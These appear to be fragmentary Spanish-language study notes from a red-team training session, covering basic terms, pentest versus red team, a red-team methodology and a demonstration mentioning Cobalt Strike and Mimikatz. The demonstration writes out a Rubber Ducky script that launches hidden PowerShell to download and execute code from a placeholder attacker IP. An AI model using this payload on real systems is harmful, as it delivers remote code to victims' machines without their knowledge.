kpmg@kpmg.com.mx

Vulnerabilidad: Debilidad o fallo en un sistema que puede ser explotado
Incidencia: Cantidad o recurrencia de una misma vuln
Payload: 
Command and control c2: Mecanismo usado por atacantes para comunicarse y controlar sistemas comprometidos dentro de una red...

**Diferencia entre Pentest y Red Team**
Red Team es similar a un Pentest con la diferencia de que la empresa no debe de detectarte.
Un ejercicio de red team es una simulación avanzada de ciberataque en la que un equipo de seguridad ofensiva....

**Equipos de Security Testing**
**Metodología de Red Team**
1. Inteligencia de amenazas = recopilar información
2. Preparación de ataques = crear vectores de ataque
3. Identificación de vulnerabilidades = Análisis de vulnerabilidades y vialidades de ataque
4. Explotación 
5. Persistencia y conexión con C&C = Garantizar el acceso remoto y conexión segura
6. Reconocimiento interno y elevación de privilegios = 
7. Movimientos laterales
8. ...

**Beneficiios de ejecutar un ejercicio de Red Team**
Identificar vulnerabilidades
Evaluar la eficacia de las herramientas de seguridad
Prueba de la preparación de los equipos de seguridad
Mejora de la respuesta a incidentes

**Demostración**
Software rubberducky???
duckener

delay 750
GUI r == win + r
delay 750
STRING powershell.exe -nop -w hidden -c "IEX ((new-objec net.webclient).downloadstring(<ip de la máquina atacante>))"
ENTER

Herramienta Cobalt strike
Listener es importante antes de cada ataque para escanear todo lo que llega al sistema victima
Beacon dentro del cobalt es: Preguntar a Deepsik
Este payload de la práctica lo que hace es crear un proceso en memoria que es invisible para el usuario 
Mimikratz qué es?

